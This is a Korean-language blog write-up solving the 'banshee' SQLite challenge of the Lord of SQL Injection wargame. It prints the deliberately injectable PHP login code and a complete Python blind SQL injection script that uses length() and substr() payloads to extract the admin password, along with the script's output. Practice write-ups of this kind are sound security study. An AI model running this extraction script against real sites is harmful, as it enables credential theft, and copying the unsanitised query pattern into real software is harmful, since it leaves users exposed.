---
title: "[Lord of SQL Injection] LoS - banshee 문제풀이"
date: 2019-07-03
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

분명히 하루에 한개씩 올리기로 했는데 몇 주 정신없다가 정신차려보니 벌써 7월이다.
몇 개 안남았으니 후딱 올려야겠다.
`SQLite`의 세 번째 문제이다.  

<!--more-->

코드는 다음과 같다.  

```php
-----------------------------------------------------------------
query : select id from member where id='admin' and pw=''
-----------------------------------------------------------------

<?php
  include "./config.php";
  login_chk();
  $db = sqlite_open("./db/banshee.db");
  if(preg_match('/sqlite|member|_/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from member where id='admin' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = sqlite_fetch_array(sqlite_query($db,$query));
  if($result['id']) echo "<h2>login success!</h2>";

  $query = "select pw from member where id='admin'"; 
  $result = sqlite_fetch_array(sqlite_query($db,$query));
  if($result['pw'] === $_GET['pw']) solve("banshee"); 
  highlight_file(__FILE__);
?>
```

이번에는 `id`는 입력받지 않고, `pw`만 입력 받는다.
`id='admin'`는 이미 있기 때문에, 문제를 풀기 위해서는 `admin`의 정확한 `pw`값을 입력해야 한다.
그래서 아래와 같이 소스코드를 구현했다.  

```python
import requests

flag = ""
length = 0

url = "https://los.rubiya.kr/chall/banshee_ece938c70ea2419a093bb0be9f01a7b1.php?pw="
session = dict(PHPSESSID = "YOUR SESSION ID")

print "[+] Start"

print "[+] Find length of the password"

for i in range(0, 20):
	try:
		query = url + "1' or id='admin' and length(pw)=" + str(i) + " -- "
		r = requests.post(query, cookies=session)
	except:
		print "[-] Error occur"
		continue

	if 'login success!' in r.text:
		length = i
		break

print "[+] Found length : ", length

print "[+] Find password"

for j in range(1, length + 1):
	for i in range(48, 128):
		try:
			query = url + "1' or id='admin' and substr(pw, " + str(j) + ", 1)='" + chr(i)
			r = requests.post(query, cookies=session)
		except:
			print "[-] Error occur"
			continue

		if 'login success!' in r.text:
			flag += chr(i)
			print "[+] Found " + str(j), ":", flag
			break

print "[+] Found password : ", flag
print "[+] End"
```

먼저 `1' or id='admin' and length(pw)=1` 형태의 쿼리를 입력 해 `pw`의 길이를 알아냈다.
이 후, `pw`의 값을 한 글자 씩 찾아 비교하기 위해 `substr(pw, 1, 1)='a'`의 쿼리를 사용했다.
해당 코드를 실행하면 결과는 다음과 같다.  

```bash
$ python ex.py 
[+] Start
[+] Find length of the password
[+] Found length :  8
[+] Find password
[+] Found 1 : 0
[+] Found 2 : 03
[+] Found 3 : 031
[+] Found 4 : 0313
[+] Found 5 : 03130
[+] Found 6 : 031309
[+] Found 7 : 0313091
[+] Found 8 : 0313091b
[+] Found password :  0313091b
[+] End
```

정상적으로 `pw` 값을 추출할 수 있었다.
해당 값을 아래와 같이 입력하면 문제를 풀 수 있다.

```plain
?pw=0313091b
```

---

```php
--------------------------------------------------------------------------
query : select id from member where id='admin' and pw='0313091b'
--------------------------------------------------------------------------

login success!
BANSHEE Clear!

<?php
  include "./config.php";
  login_chk();
  $db = sqlite_open("./db/banshee.db");
  if(preg_match('/sqlite|member|_/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from member where id='admin' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = sqlite_fetch_array(sqlite_query($db,$query));
  if($result['id']) echo "<h2>login success!</h2>";

  $query = "select pw from member where id='admin'"; 
  $result = sqlite_fetch_array(sqlite_query($db,$query));
  if($result['pw'] === $_GET['pw']) solve("banshee"); 
  highlight_file(__FILE__);
?>
```

---

```plain
BANSHEE Clear!!
```